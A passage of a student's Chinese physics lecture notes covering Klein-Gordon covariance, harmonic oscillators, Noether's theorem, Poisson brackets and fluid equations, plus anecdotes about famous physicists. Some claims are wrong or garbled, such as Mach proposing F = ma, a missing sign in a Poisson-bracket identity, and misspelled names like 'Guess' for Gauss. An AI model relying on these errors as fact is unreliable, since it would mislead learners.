这样的操作可以做就是了, 咳, 我还是以后学啦.&lt;/p&gt;

&lt;h4 id=&quot;克莱因-戈登方程&quot;&gt;克莱因-戈登方程&lt;/h4&gt;
&lt;p&gt;2st order in time, 2nd order in space, 满足洛伦兹协变, 但是时间二阶无法描述
氢原子行为. 狄拉克将空间降阶位一阶, 但还是没有解决负能量的问题.&lt;/p&gt;

&lt;p&gt;这个方程是满足洛伦兹协变的.&lt;/p&gt;

&lt;p&gt;比如通过洛伦兹变换, 可以得到:&lt;/p&gt;

\[\frac{\partial}{\partial x} = \frac{\partial}{\partial x'} \frac{\partial x'}{\partial x} + \frac{\partial}{\partial t'} \frac{\partial t'}{\partial t} = \gamma \frac{\partial}{\partial x'} - \frac{\gamma v}{c^2} \frac{\partial}{\partial t'} \\ \frac{\partial^2}{\partial x^2} = \gamma^2 \frac{\partial^2}{\partial x'^2} + (\frac{\gamma v}{c^2})^2 \frac{\partial^2}{\partial t'^2} - 2 \frac{\gamma^2 v}{c^2} \frac{\partial^2}{\partial x' \partial t} \\ \frac{\partial}{\partial t} = - \gamma v \frac{\partial}{\partial x'} + \gamma \frac{\partial}{\partial t'}\]

&lt;p&gt;代入到Klein-Gordon Equation中,&lt;/p&gt;

\[(\square + \mu^2)\psi = 0\]

&lt;p&gt;只需要看前面的算子部分就好了, (经过化简可以得到)变换前后只是把$t$变成$t’$, 
$x$变成$x’$而已. 于是说明是保持洛伦兹变换的.&lt;/p&gt;

&lt;h3 id=&quot;others&quot;&gt;Others&lt;/h3&gt;
&lt;h4 id=&quot;dimension&quot;&gt;Dimension&lt;/h4&gt;
&lt;p&gt;Principle of Dimensional Homogeneity:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;方程两边对应的&lt;strong&gt;量纲的次数&lt;/strong&gt;相等&lt;/li&gt;
  &lt;li&gt;方程两边的&lt;strong&gt;导数&lt;/strong&gt;次数相等&lt;/li&gt;
  &lt;li&gt;爱丁顿: 量纲一致性包括张量方程中的&lt;strong&gt;协变&lt;/strong&gt;和&lt;strong&gt;逆变&lt;/strong&gt;一致&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;谐振子模型&quot;&gt;谐振子模型&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;有学者认为, 理论物理的$75\%$都是谐振子模型&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;首先, 是简单的利用牛顿定律列出&lt;strong&gt;动力学方程&lt;/strong&gt;的做法:&lt;/p&gt;

\[m \ddot{\boldsymbol{x}} = - k \boldsymbol{x}\\
I \ddot{\theta} = M = \lambda \theta\]

&lt;p&gt;实际上直接就:&lt;/p&gt;

\[\ddot{q} + \omega^2 q = 0\]

&lt;p&gt;还有利用&lt;strong&gt;能量守恒&lt;/strong&gt;的方法写出方程:&lt;/p&gt;

\[E = \frac{m \dot{x}^2}{2} + \frac{1}{2} k x^2 = T + V \\ \frac{\mathrm{d} E}{\mathrm{d} t} = 0 \Rightarrow m \ddot{x} + k x = 0\]

&lt;p&gt;对谐振子模型的&lt;strong&gt;相对论&lt;/strong&gt;处理方式:&lt;/p&gt;

&lt;p&gt;对质量展开:&lt;/p&gt;

\[m = \gamma m_0 \simeq m_0 (1 + \frac{1}{2} \frac{v^2}{c^2} + \frac{3}{8} \frac{v^4}{c^4} + \cdots),\ (\frac{v}{c} \ll 1)\]

&lt;p&gt;考虑原来的周期:&lt;/p&gt;

\[\tau = 2\pi \sqrt{\frac{\langle m \rangle_t}{k}}\]

&lt;p&gt;(其中$\langle m \rangle_t$就是质量对时间的平均, 即
\(\langle m \rangle_t = \frac{1}{\tau} \int_{0}^{\tau} m(t) \mathrm{d} t\)
)&lt;/p&gt;

&lt;p&gt;当然, 也可以对位移进行平均, 结果是类似的.&lt;/p&gt;

\[\langle m \rangle_{\boldsymbol{x}} = \frac{1}{2A} \int_{-A}^{A} m(x) \mathrm{d} x\]

&lt;p&gt;&lt;strong&gt;量子的振动&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;考虑一维振动, $V = \frac{1}{2} m \omega^2 x^2$&lt;/p&gt;

\[H = \frac{p^2}{2 m} + V = E \\ S = \int p \mathrm{d} q \Rightarrow p = \frac{\partial S}{\partial x} \\\]

&lt;p&gt;&lt;strong&gt;振动的波方程&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;对于弦的波动方程:&lt;/p&gt;

\[\mu \frac{\partial^2 u}{\partial t^2} = T \frac{\partial^2 u}{\partial x^2} \\ \Leftrightarrow \square u = 0\]

&lt;h4 id=&quot;量&quot;&gt;量&lt;/h4&gt;
&lt;p&gt;根据量的类型:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;强度量 &lt;strong&gt;Intensive Quantity&lt;/strong&gt;: 密度, 温度&lt;/li&gt;
  &lt;li&gt;广延量 &lt;strong&gt;Extensice Quantity&lt;/strong&gt;: 体积, 面积 &lt;em&gt;可以累加&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;根据量的关系, 也就是共轭(conjugate):&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Energy Conjugation: i.e. $W = \boldsymbol{F} \Delta \boldsymbol{x}$&lt;/li&gt;
  &lt;li&gt;Action Conjugation: i.e. $S = \int \boldsymbol{p} \cdot \boldsymbol{q}$&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;对称和守恒&quot;&gt;对称和守恒&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;诺顿定理: 守恒律对应不变性(Symmetry invariance)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;黑洞三毛定律: 进入黑洞中, 仍然保持不变的量是: &lt;strong&gt;质量&lt;/strong&gt;, &lt;strong&gt;电荷&lt;/strong&gt;, &lt;strong&gt;角动量&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;在经典力学中, 有动量, 动量矩, 能量, LRL矢量守恒&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Mass Continuity Equation&lt;/strong&gt;&lt;/p&gt;

\[\frac{\partial \rho}{\partial t} + \nabla \cdot (\rho \boldsymbol{v}) = 0\]

&lt;p&gt;&lt;strong&gt;Time Reversal&lt;/strong&gt;&lt;/p&gt;

\[t \mapsto - t \\ i \mapsto -i \\ \boldsymbol{x} \mapsto -\boldsymbol{x} \\ \boldsymbol{v} \mapsto -\boldsymbol{v} \\ \boldsymbol{a} \mapsto \boldsymbol{a} \\ \boldsymbol{J} \mapsto -\boldsymbol{J} \\ \boldsymbol{E} \mapsto \boldsymbol{E} \\ \boldsymbol{B} \mapsto -\boldsymbol{B}\]

&lt;p&gt;&lt;strong&gt;Charge Conjugation&lt;/strong&gt;&lt;/p&gt;

\[\rho \mapsto - \rho \\ \boldsymbol{E} \mapsto - \boldsymbol{E} \\ \boldsymbol{B} \mapsto - \boldsymbol{B} \\ \boldsymbol{J} \mapsto - \boldsymbol{J}\]

&lt;p&gt;&lt;strong&gt;Conjugate Transpose 共轭转置&lt;/strong&gt;&lt;/p&gt;

\[(\boldsymbol{A}^H)_{i j} = \overline{\boldsymbol{A}_{j i}}\]

&lt;h4 id=&quot;noethers-theorem-proof&quot;&gt;Noether’s Theorem Proof&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Space Translatioin Invariant &amp;lt;-&amp;gt; Momentum Conservation&lt;/li&gt;
  &lt;li&gt;Time Translation Invariant &amp;lt;-&amp;gt; Energy Conservation&lt;/li&gt;
  &lt;li&gt;Space Rotation Invariant &amp;lt;-&amp;gt; Angular Momentum Conservation&lt;/li&gt;
  &lt;li&gt;Mass Conservation (也是一种能量守恒)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;carriers&quot;&gt;Carriers&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Graviton&lt;/strong&gt; 引力子 (尚未被发现) 引力
$\frac{G M_p}{\hbar c} \sim 5.9 \times 10^{-39}$&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bosons&lt;/strong&gt; 玻色子 弱力&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Photons&lt;/strong&gt; 光子 电磁力
$\alpha = \frac{e^2}{4 \pi \varepsilon_0 \hbar c} \approx \frac{1}{137}$&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Gluons&lt;/strong&gt; 胶子 强力&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;算符化&quot;&gt;算符化&lt;/h4&gt;
&lt;p&gt;虽然我对这个不是很清楚, 但是这个好像就是基于一个假设, 
就是假如一个方程成立, 那么将它们(中的比如说$\boldsymbol{p}$, $E$)
算符化后作用到波函数上, 方程仍然成立.&lt;/p&gt;

&lt;p&gt;首先有一个关系: (在一个波中)&lt;/p&gt;

\[\left\{ \begin{array}{lll} \boldsymbol{p} &amp;amp; = &amp;amp; \hbar \boldsymbol{k} \\ E &amp;amp; = &amp;amp; \hbar \omega \end{array}\right.\]

&lt;p&gt;然后对于物质波: $\varphi = e^{i (\boldsymbol{k} \cdot \boldsymbol{r} - \omega t)} = e^{\frac{i}{\hbar}(\boldsymbol{p} \cdot \boldsymbol{r} - E t)}$&lt;/p&gt;

&lt;p&gt;于是就可以得到了好结果.&lt;/p&gt;

\[\frac{\partial \varphi}{\partial t} = - \frac{i E}{\hbar} \varphi \\ \Rightarrow \hat{E} = i \hbar \frac{\partial}{\partial t} \\ \nabla \varphi = \frac{i}{\hbar} \nabla(\boldsymbol{p} \cdot \boldsymbol{r}) \varphi = \frac{i}{\hbar} \boldsymbol{p} \varphi \\ \Rightarrow \hat{\boldsymbol{p}} = - i \hbar \nabla\]

&lt;p&gt;(注: 虽然赵爹说这个是一个推导过程, 但是实际上我觉得里面有一个假设, 
认为物质的分布概率就是满足一种类似于波的分布的假设, 然后根据这样的概率, 
就得到了物质波的一个假设. )&lt;/p&gt;

&lt;h4 id=&quot;变换&quot;&gt;变换&lt;/h4&gt;
&lt;p&gt;规范变换.&lt;/p&gt;

&lt;h3 id=&quot;math&quot;&gt;Math&lt;/h3&gt;
&lt;h4 id=&quot;平面极坐标系&quot;&gt;平面极坐标系&lt;/h4&gt;

\[\left\{ \begin{array}{lll} \mathrm{d} \hat{\boldsymbol{e}}_{\theta} &amp;amp; = &amp;amp; - \dot{\theta} \hat{\boldsymbol{e}}_{r} \\ \mathrm{d} \hat{\boldsymbol{e}}_{r} &amp;amp; = &amp;amp; \dot{\theta} \hat{\boldsymbol{e}}_{\theta} \end{array}\right.\]

&lt;p&gt;(注: 可以利用$SO(2)$的来帮助理解. )&lt;/p&gt;

&lt;h4 id=&quot;线性&quot;&gt;线性&lt;/h4&gt;
&lt;p&gt;满足这样的方程的就是线性方程:&lt;/p&gt;

\[f(\alpha X + \beta Y) = \alpha f(X) + \beta f(Y)\]

&lt;p&gt;如何验证一个方程是线性的, 只要将两个&lt;em&gt;可行解&lt;/em&gt;的&lt;em&gt;线性组合&lt;/em&gt;代入原方程, 
然后只要这个方程是线性的, 那么就说明这个方程就是线性方程.&lt;/p&gt;

&lt;h4 id=&quot;算子还有指标运算&quot;&gt;算子还有指标运算&lt;/h4&gt;
&lt;p&gt;这里的算子的运算规则就是限制在Cartesian Coordinate System中的. 
(嗯, 没错, 在别的地方还会又一些不一样的地方, 可以看张量运算的地方. )&lt;/p&gt;

\[\vec{a} \times \vec{b} = a_i b_j \varepsilon_{i j k} \hat{e}_k \\ \vec{a} \cdot \vec{b} = a_i b_j \delta_{i j} \\ \varepsilon_{k i j} \varepsilon_{k m n} = \delta_{i m} \delta_{j n} - \delta_{i n} \delta_{j m} \\ a \times (b \times c) = b (a \cdot c) - c (a \cdot b)\]

&lt;p&gt;其中还有一个Einstein Summation Convenrion, 就是对重复的指标进行求和, 
(在张量运算里面, 同时有上指标和下指标的进行求和), 比如:&lt;/p&gt;

\[\delta_{i i} = \delta_{1, 1} + \delta_{2, 2} + \delta_{3, 3} = 3\]

&lt;p&gt;对于$\nabla$算符, 可以通过分量的写法来做, 也可以直接通过算符整体的运算来做.&lt;/p&gt;

\[\nabla \cdot \boldsymbol{r} = 3 \\ \nabla r = \boldsymbol{r} \\ \nabla(\boldsymbol{A} \cdot \boldsymbol{r}) = \boldsymbol{A} \\ \nabla f(\boldsymbol{r}) = \frac{\mathrm{d} f}{\mathrm{d} \boldsymbol{r}}\]

&lt;p&gt;(注: 最后的就是形式的求导. )&lt;/p&gt;

&lt;p&gt;并且对算符的运算可以利用算符的矢量性和算符性来计算.&lt;/p&gt;

&lt;h4 id=&quot;矢量微积分的例子&quot;&gt;矢量微积分的例子&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;物质导数&lt;/strong&gt;&lt;/p&gt;

\[\frac{\mathrm{d}\boldsymbol{v}}{\mathrm{d}t} = \frac{\partial \boldsymbol{v}}{\partial t} + \sum \frac{\partial \boldsymbol{v}}{\partial q_i} \frac{\mathrm{d} q_i}{\mathrm{d}t} = \frac{\partial \boldsymbol{v}}{\partial t} + (\boldsymbol{v} \cdot \nabla) \boldsymbol{v}\]

&lt;p&gt;并且这里还有一个方向导数的概念:&lt;/p&gt;

\[\frac{\partial f}{\partial \boldsymbol{a}} = (\boldsymbol{a} \cdot \nabla) f\]

&lt;p&gt;&lt;strong&gt;Navier-Stokes Equation&lt;/strong&gt;&lt;/p&gt;

\[\rho \frac{\mathrm{d} \boldsymbol{v}}{\mathrm{d} t} = - \nabla p + \mu \nabla^2 \boldsymbol{v} + \rho \boldsymbol{g} \\ \Leftrightarrow \rho (\frac{\partial \boldsymbol{v}}{\partial t} + (\boldsymbol{v} \cdot \nabla) \boldsymbol{v})= - \nabla p + \mu \nabla^2 \boldsymbol{v} + \rho \boldsymbol{g}\]

&lt;p&gt;&lt;strong&gt;Lamb Vector&lt;/strong&gt;&lt;/p&gt;

\[\boldsymbol{L} = (\nabla \times \boldsymbol{v}) \times \boldsymbol{v} = \boldsymbol{\omega} \times \boldsymbol{v}\]

&lt;p&gt;&lt;strong&gt;伯努利方程&lt;/strong&gt;   &lt;br /&gt;
首先要知道一些成立条件:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Steady State 定常 $\frac{\partial \boldsymbol{v}}{\partial t} = 0$&lt;/li&gt;
  &lt;li&gt;Inviscous 无黏 $\mu = 0$&lt;/li&gt;
  &lt;li&gt;Conservative 有势 $\boldsymbol{g} = - \nabla (g z)$&lt;/li&gt;
  &lt;li&gt;Uniform 均质 $\rho = \mathrm{const} \Rightarrow - \frac{1}{\rho} \nabla p = - \nabla (\frac{p}{\rho})$&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;于是可以发现Navier-Stokes Equation&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;$2\omega$的故事&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;possion-bracket-1&quot;&gt;Possion Bracket&lt;/h4&gt;
&lt;p&gt;1809年, 泊松提出了一种求导的顺序:&lt;/p&gt;

\[[f, g] = \sum_k (\frac{\partial f}{\partial q_k} \frac{\partial g}{\partial p_k} - \frac{\partial f}{\partial p_k} \frac{\partial g}{\partial q_k})\]

&lt;p&gt;(注: 在朗道的书里面, 泊松括号和正常的差了一个负号. )&lt;/p&gt;

&lt;p&gt;对于Possion括号, 有一些基本的性质:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;常数为零: $[f, C] = 0$&lt;/li&gt;
  &lt;li&gt;反对称性: $[f, g] = - [g, f]$
    &lt;ul&gt;
      &lt;li&gt;$\Rightarrow [f, f] = 0$&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;链式法则: $[f_1 f_2, g] = f_1 [f_2, g] + f_2 [f_1, g]$&lt;/li&gt;
  &lt;li&gt;时间变化率: $\frac{\partial}{\partial t} [f, g] = [\frac{\partial}{\partial t} f, g] + [f, \frac{\partial}{\partial t} g]$      &lt;br /&gt;
(不就是利用了偏微分求导的可交换性嘛…)&lt;/li&gt;
  &lt;li&gt;$[f, [g, h]] + [g, [h, f]] + [h, [f, g]] = 0$    &lt;br /&gt;
(像是轮换? )&lt;/li&gt;
  &lt;li&gt;泰勒展开
    &lt;ul&gt;
      &lt;li&gt;$f(t) = f_0 + [f, H] t + [[f, H], H] \frac{t^2}{2} + \cdots$&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;简单的几个结论:
    &lt;ul&gt;
      &lt;li&gt;$[q_k, f] = \frac{\partial f}{\partial p_k}$&lt;/li&gt;
      &lt;li&gt;$[p_k, f] = \frac{\partial f}{\partial q_k}$&lt;/li&gt;
      &lt;li&gt;$[q_{\alpha}, p_{\beta}] = \delta_{\alpha \beta}$&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;group-theory&quot;&gt;Group Theory&lt;/h4&gt;
&lt;p&gt;对于旋转矩阵:&lt;/p&gt;

\[\boldsymbol{A} = \left( \begin{array}{ll} \cos \theta &amp;amp; \sin \theta \\ - \sin \theta &amp;amp; \cos \theta \end{array} \right) \in SO(2)\]

&lt;h2 id=&quot;历史部分&quot;&gt;历史部分&lt;/h2&gt;
&lt;h3 id=&quot;科学和哲学以及玄学神学&quot;&gt;科学和哲学以及玄学(神学)&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;All &lt;strong&gt;definite&lt;/strong&gt; knowledge - so I should contend - belongs to science; 
all &lt;strong&gt;dogma&lt;/strong&gt; as to what surpasses definite knowledge belongs to theology. 
But between theology and science there is a &lt;strong&gt;No Man’s Land&lt;/strong&gt;, 
exposed to attack by both sides; this No Man’s Land is philosophy.    &lt;br /&gt;
&lt;em&gt;B.Russell, The History of Western Philosophy (ed. 1965)&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;西方哲学&quot;&gt;西方哲学&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;哲学的框架:
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Methodology&lt;/strong&gt; 方法论 - 哲学的枝叶&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Epistemology&lt;/strong&gt; 认识论 - 哲学的树干
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;Empirrcalism&lt;/strong&gt; 经验主义   &lt;br /&gt;
也叫英伦经验主义
            &lt;ul&gt;
              &lt;li&gt;John Locke (England)&lt;/li&gt;
              &lt;li&gt;George Berkeley (Ireland)&lt;/li&gt;
              &lt;li&gt;David Huume (Scotland)  &lt;br /&gt;
提出了&lt;strong&gt;因果律&lt;/strong&gt; (和欧几里德公里体系并称为&lt;em&gt;两千年来科学史最伟大的成就&lt;/em&gt;)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;strong&gt;Rationalism&lt;/strong&gt; 理性主义
            &lt;ul&gt;
              &lt;li&gt;Rene Decartes (France)
                &lt;blockquote&gt;
                  &lt;p&gt;I think therefore I am.&lt;/p&gt;
                &lt;/blockquote&gt;
              &lt;/li&gt;
              &lt;li&gt;Spinoza (Netherlands)   &lt;br /&gt;
每个人心中都有一个不同的God&lt;/li&gt;
              &lt;li&gt;Leibniz (German)  &lt;br /&gt;
单子论提出者, 撬棍$\int$发明者  &lt;br /&gt;
(&lt;em&gt;单子论&lt;/em&gt;: 认为是事物最根本的原素, 不可再分, 没有时空延展性, 
是抽象的存在, 即形而上粒子; &lt;em&gt;原子论&lt;/em&gt;: 类似于原子概念的理论)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;两种的融合
            &lt;ul&gt;
              &lt;li&gt;Wolff, 将哲学分为&lt;em&gt;理论哲学&lt;/em&gt;和&lt;em&gt;应用哲学&lt;/em&gt;&lt;/li&gt;
              &lt;li&gt;Kant, &lt;em&gt;统一&lt;/em&gt;经验主义和理性主义, &lt;strong&gt;认为知识源于经验, 形成于理性&lt;/strong&gt; &lt;br /&gt;
提出了&lt;em&gt;二律背反&lt;/em&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Ontology&lt;/strong&gt; 本体论 - 哲学的树根&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;现代哲学的起点: 笛卡尔的三个梦(风雪交加, 军营, 莱茵河畔)&lt;/li&gt;
  &lt;li&gt;Philosophy 的第一次提出是由数学家 Pythagoras 提出的
    &lt;blockquote&gt;
      &lt;p&gt;Pythagoraenism: “All is number. “     &lt;br /&gt;
当Pythagoras完成了自己的这个定理的证明后, 就杀了100头公牛(oxen)来庆祝, 
所以当公牛们开始发抖的时候, 有新的定理就得到了证明. (坊间笑话)&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Pythagoras 还有一个理论 &lt;em&gt;Music of the Spheres&lt;/em&gt;, 认为天上的音乐一直都有, 
但是人们听惯了却自动忽略了. Kappler受其影响, 写了 &lt;em&gt;Harmonies of the World&lt;/em&gt;. 
(coldplay 也有一个这个名字的专辑)&lt;/li&gt;
  &lt;li&gt;Karl Max的论文&lt;em&gt;Democriyus vs. Epicurus&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Guess对哲学的批判:
    &lt;blockquote&gt;
      &lt;p&gt;你在当代哲学家谢林, 黑格尔, 內斯·冯·埃森贝克和他们的追随者身上
看到同样的东西 – 数学上的无能; 他们的理论怎能不使你毛骨悚然? 
读读古代哲学史中当时的大人物 – 柏拉图和其他人(我把亚里士多德除外) – 
都提出了一些错误的理论. 甚至康德本人也不怎么样. 
我认为他对分析命题和综合命题所作的区分, 要么是平凡不足道的, 
要么是错误的.      &lt;br /&gt;
– Guess 对 舒马赫的信&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;伽利略的故事合集&quot;&gt;伽利略的故事合集&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;伽利略的科学方法
    &lt;ul&gt;
      &lt;li&gt;Deduction: 归纳演绎&lt;/li&gt;
      &lt;li&gt;Experiment: 和实验结合&lt;/li&gt;
      &lt;li&gt;Thought Experiment: 思想实验&lt;/li&gt;
      &lt;li&gt;Mathematics: 和数学结合&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;伽利略的科学哲学
    &lt;ul&gt;
      &lt;li&gt;Empirist 经验主义者
        &lt;blockquote&gt;
          &lt;p&gt;Whewell and Mach classified Galileo as empirist 
because of the drop test at the Leaning tower of Pisa.&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;Rationalist 理性主义者
        &lt;blockquote&gt;
          &lt;p&gt;Galileo Galilei: Mathematics is the language in which 
God has written the Universe. 
so the French Alexander Koyré classified Galilei as rationalist.&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;伽利略的所有子女都不是婚姻关系所生的&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;牛顿的故事合集&quot;&gt;牛顿的故事合集&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Newtonianism&lt;/strong&gt; and &lt;strong&gt;Darwinism&lt;/strong&gt;  &lt;br /&gt;
other than Newtonianism, the Darwinism thinks that the system is 
&lt;strong&gt;non-time-reversal&lt;/strong&gt;, &lt;strong&gt;nonlinear&lt;/strong&gt; and is a &lt;strong&gt;complex&lt;/strong&gt; system.&lt;/li&gt;
  &lt;li&gt;牛顿力学为何只产生于天体而不是车行马走中?   &lt;br /&gt;
模型更加的简单, (数学上的)更加和谐干净, 上帝视角和蚂蚁视角, 牛顿范式: 
通过微分方程来研究, 并且研究对象比较少, 数学处理起来比较简单. 
历史原因: Halley把自己的行星观测结果给了老牛, 
说自己看不懂, 然后爵爷就脱口而出, “椭圆”, 然后把自己解释计算过程的东西拓展, 
最后写成了原理一书.&lt;/li&gt;
  &lt;li&gt;Emst Mach 在自己的著作&lt;em&gt;力学史评&lt;/em&gt;中提出了$\boldsymbol{F} = m \boldsymbol{a}$, 
这本书中重炮轰击&lt;em&gt;绝对时空观&lt;/em&gt;, 对Einstein影响很大. 注意这里的$m$有引力质量, 
惯性质量的区别.&lt;/li&gt;
  &lt;li&gt;牛顿的学生是财政部长, 所以在牛顿写完了原理之后, 对物理学的兴趣减少了之后, 
牛顿就当了皇家铸币厂厂长. (金本位就是他提出来的)&lt;/li&gt;
  &lt;li&gt;厂里的事都是他外甥女婿干的, 家里的事又是他外甥女干的, 
现在很多的牛顿的事都是他外甥女(一个传记作者)写出来的&lt;/li&gt;
  &lt;li&gt;“From the paw, I saw the lion. “ &lt;br /&gt;
有一次伯努利想了一个很棒的题目来考牛顿, (最速降线), 
然后在牛顿的外甥女的记载中: 下午五点, 牛顿爵士拖着疲惫的身体从厂里回来, 
用完晚餐, 就开始做伯努利出的题, 凌晨三点钟才睡觉. 然后就把这封信寄了回去, 
(匿名的), 然后伯努利就说了上面那句金句.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;欧拉的故事合集&quot;&gt;欧拉的故事合集&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Euler’s Master Degree Papers: 
&lt;em&gt;Comparison between the Philosophies of Decartes &amp;amp; Newton&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Euler vs Humme
    &lt;blockquote&gt;
      &lt;p&gt;Sir, since … (据说是一个数学公式), hence the god exists, say.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Euler提出了对微元体的定义:   &lt;br /&gt;
可以说就是这样的微元体的有点像是哲学思辨的思想才产生了流体力学的一部分基础.
    &lt;ul&gt;
      &lt;li&gt;宏观无穷小&lt;/li&gt;
      &lt;li&gt;微观无穷大&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;拉格朗日故事集&quot;&gt;拉格朗日故事集&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;19岁, Professor&lt;/li&gt;
  &lt;li&gt;Before 20, wrote a letter to Euler, showing his ambition: 
&lt;strong&gt;One principle to unit solid and fluids.&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;他分析力学中没有一张图片, 受到Kant的影响, 认为要贯彻自己分析力学的本体
    &lt;blockquote&gt;
      &lt;p&gt;He owned no his phliosophy, he was deeply affected by Kant.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;分析力学的思想还来自Johann Bernouli的Vitrual Velocity的思想, 
提出了Principle of Virtual Work&lt;/li&gt;
  &lt;li&gt;Euler 是个好老师, 为了吸引Lagrange的兴趣, 把自己的很多发现都压下不发表, 
留给Lagrange来做.&lt;/li&gt;
  &lt;li&gt;23岁时, 受Euler推荐做了柏林科学院的外籍院士&lt;/li&gt;
  &lt;li&gt;庆幸自己家里破产了, 不然就学不成数学了&lt;/li&gt;
  &lt;li&gt;Legendre 帮助 Lagrange出版了他的书, 甚至动用自己的社会力量, 
请巴黎的马里神父出版了分析力学. 
虽然出版了书之后Lagrange就对自己的书也不在意了.&lt;/li&gt;
  &lt;li&gt;1792年, 丧偶9年的Lagrange同天文学家勒莫尼埃的女儿
Renée·Francoise·Adelaide结婚, Adelaide同情他的遭遇, 执意要和他结婚, 
并一直矢志不渝, 所以Lagrange才开始重新着手分析力学的修改.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薛定谔故事合集&quot;&gt;薛定谔故事合集&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;刚到维也纳大学, 一周上课11学时, 特别是周二最忙&lt;/li&gt;
  &lt;li&gt;上课有一门就是分析力学&lt;/li&gt;
  &lt;li&gt;和Feynmann一样, 手很快, 想明白了就不把问题给学生了, 所以据说当他研究生就很惨&lt;/li&gt;
  &lt;li&gt;明人不做暗事, 薛定谔和情人出去绝不掩饰&lt;/li&gt;
  &lt;li&gt;薛定谔关于自己获得诺贝尔奖的说法: 
(对Itha Junger说的, Itha Junger14岁和薛定谔相遇? )
    &lt;blockquote&gt;
      &lt;p&gt;I didn’t write everything down at once, I kept changing here and there
 until finally I got the equation. When I got it, 
I knew I got the Norble Prize.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;爱因斯坦的故事合集&quot;&gt;爱因斯坦的故事合集&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;被老师Minkowski批评为”lazy dog”, 因为他老是逃课&lt;/li&gt;
  &lt;li&gt;但是Einstein的逃课是为了学电磁学, 所以在他本科毕业了之后, 
对麦克斯韦方程有惊人的认识&lt;/li&gt;
  &lt;li&gt;逃课还有一个原因是因为他认为Weber老师上的课too old fashioned&lt;/li&gt;
  &lt;li&gt;Einstein本科毕业了之后没有工作, 只好靠自己的同学的父亲在专利局干活, 
收入很低, 抽的烟也很烂&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;数学的三大主义&quot;&gt;数学的三大主义&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;直觉主义 &lt;strong&gt;Intuitionism&lt;/strong&gt;: Hermann Weyl   &lt;br /&gt;
Brouwer认为数学是一定可以被构造的, 在博士论文中提出了直觉主义; 
Hilbert为他写了推荐信, 但是后来发现他和自己的完全不一样, 
甚至还把自己的学生Weyl骗走了, 于是打算把他撤职; 
